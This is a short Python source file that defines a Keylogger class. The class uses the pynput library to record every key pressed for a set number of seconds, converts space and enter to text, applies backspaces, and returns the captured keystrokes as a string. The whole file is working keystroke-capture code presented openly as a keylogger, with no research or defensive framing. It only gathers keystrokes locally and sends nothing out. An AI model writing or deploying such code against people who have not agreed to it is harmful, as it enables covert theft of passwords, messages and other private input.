from pynput.keyboard import Listener
import datetime

class Keylogger():
    def __init__ (self, time):
        self.__log = ""
        self.__start = 1
        self.__time = time
    def setTime(self, value):
        self.__time = value    
    def run(self):
        self.__start = datetime.datetime.now()
        def anonymous(key):
            now = datetime.datetime.now()
            key = str(key)
            if now.timestamp() - self.__start.timestamp() >= self.__time:
                listener.stop()
            if key == "Key.space":
                key = " "
            if key == "Key.enter":
                key = "\n"
            if key != "Key.backspace":
                key = key.replace("'","")
                self.__log += key
            else:
                self.__log = self.__log[:-1]

        with Listener (on_press=anonymous) as listener:
            listener.join()
        return self.__log
            
    def getResult(self):
        return self.__log

